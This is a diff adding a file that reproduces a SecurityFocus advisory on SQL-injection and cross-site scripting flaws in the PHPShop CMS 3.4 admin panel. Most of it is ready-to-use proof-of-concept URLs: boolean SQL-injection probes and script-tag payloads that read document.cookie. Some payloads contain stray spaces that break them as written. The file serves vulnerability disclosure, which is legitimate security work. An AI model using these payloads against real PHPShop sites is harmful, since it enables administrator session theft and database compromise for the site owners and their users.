@@ -1,0 +1,38 @@
+source: http://www.securityfocus.com/bid/51130/info
+
+PHPShop CMS is prone to multiple cross-site scripting and SQL-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+PHPShop CMS 3.4 is vulnerable; prior versions may also be affected. 
+
+SQL:
+
+http://www.example.com/phpshop/admpanel/photo/admin_photo_content.php?pid=6%20AND%201=2
+
+http://www.example.com/phpshop/admpanel/page/adm_pages_new.php?catalogID=3%20AND%201=2
+
+http://www.example.com/phpshop/admpanel/catalog/admin_cat_content.php?pid=3%20AND%201=2
+
+http://www.example.com/phpshop/admpanel/catalog/adm_catalog_new.php?id=3%20AND%201=1
+
+XSS:
+
+http://www.example.com/phpshop/admpanel/banner/adm_baner_new.php/%22%3E%3Cscript%3Ealert%28document.cookie%29 ;%3C/script%3E
+
+http://www.example.com/phpshop/admpanel/gbook/adm_gbook_new.php/%22%3E%3Cscript%3Ealert%28document.cookie%29; %3C/script%3E
+
+http://www.example.com/phpshop/admpanel/links/adm_links_new.php/%22%3E%3Cscript%3Ealert%28document.cookie%29; %3C/script%3E
+
+http://www.example.com/phpshop/admpanel/menu/adm_menu_new.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3 C/script%3E
+
+http://www.example.com/gbook/?a=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/phpshop/admpanel/catalog/admin_cat_content.php?pid=%22%3E%3Cscript%3Ealert%28document. cookie%29;%3C/script%3E
+
+http://www.example.com/phpshop/admpanel/catalog/adm_catalog_new.php?id=%%22%3E%3Cscript%3Ealert%28document.co okie%29;%3C/script%3E
+
+http://www.example.com/phpshop/admpanel/page/adm_pages_new.php?catalogID=%22%3E%3Cscript%3Ealert%28document.c ookie%29;%3C/script%3E
+
+http://www.example.com/phpshop/admpanel/photo/admin_photo_content.php?pid=%22%3E%3Cscript%3Ealert%28document. cookie%29;%3C/script%3E
+
